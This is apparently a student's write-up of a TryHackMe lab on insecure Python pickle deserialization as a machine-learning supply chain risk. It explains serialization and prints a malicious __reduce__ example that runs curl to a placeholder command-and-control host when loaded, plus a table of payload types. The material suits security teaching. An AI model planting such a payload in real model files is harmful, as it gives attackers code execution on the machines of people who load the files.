# TryHackMe — Insecure Deserialization as a Supply Chain Attack Vector

> Practical exploration of insecure Python deserialization using
> `pickle` 
> - as a supply chain attack vector in the serilisation process

## Source Lab

This project is based on the
[TryHackMe Supply Chain Attack Vector] room.

The purpose of this repository is to document my learning process,
analysis, commands, observations, and mitigation strategies while
working through the lab.

---

## Objectives

- Understand serialization and deserialization
- Understand how Python `pickle` works
- Identify insecure deserialization
- Analyze a malicious serialized object
- Understand how `__reduce__()` can influence deserialization
- Understand the security impact
- Explore safer alternatives and mitigations
- Compearing model cards to identify the malicous and bieng models before download for use.  

---

## Environment

- OS: Kali Linux
- Python: 3.x
- TryHackMe: Insecure Deserialization
- Tools: Python, Pickletools(safe), Linux terminal

---

## 01 — Understanding Serialization

### What is Serilisation ?

Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. **Serialisation** converts that into a file on disk. **Deserialisation** is the reverse: unpacking the file back into a usable Python object.

Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.

Here is a simple example of saving and loading a model with pickle:

    import pickle
    # Serialise (save) a model to a file
    model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
    with open("model.pkl", "wb") as f:
        pickle.dump(model, f)

    # Deserialise (load) the model back
    with open("model.pkl", "rb") as f:
        loaded_model = pickle.load(f)
        

This looks harmless. The problem is in how pickle handles custom objects.

#### The __reduce__ Method

When pickle saves a custom Python object, it calls a special method called __reduce__. This method returns instructions for reconstructing the object later. Python follows those instructions automatically when you callpickle.load(), with no prompts and no warnings.

Here is the problem: __reduce__ can tell Python to call any function with any arguments. Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.

### A Malicious Example 

This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:

    import pickle
    import os

    class MaliciousModel:
        def __reduce__(self):
            # pickle.load() will call os.system() with this command
            return (os.system, ("curl http://c2.example.com/beacon",))

    with open("backdoored_model.pkl", "wb") as f:
        pickle.dump(MaliciousModel(), f)

The victim calls pickle.load() expecting model weights. Python calls os.system() instead, running curl to ping the attacker's server in the background. The same happens with torch.load() since PyTorch uses pickle internally.

**A useful analogy** would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.


### What Attackers Can Do 

| Payload       | Impact |
| :---          |    :----:   |
| Reverse shell | Full Remote Access to victims machine     |
| Data exfilteration    | Steal sensitive files such as credentials or source code |
| Crypto miner | Uses the victim's computer resources to mine cryptocurrency   |
| Reconnaissance | Maps usernames, hostnames, and running processes |






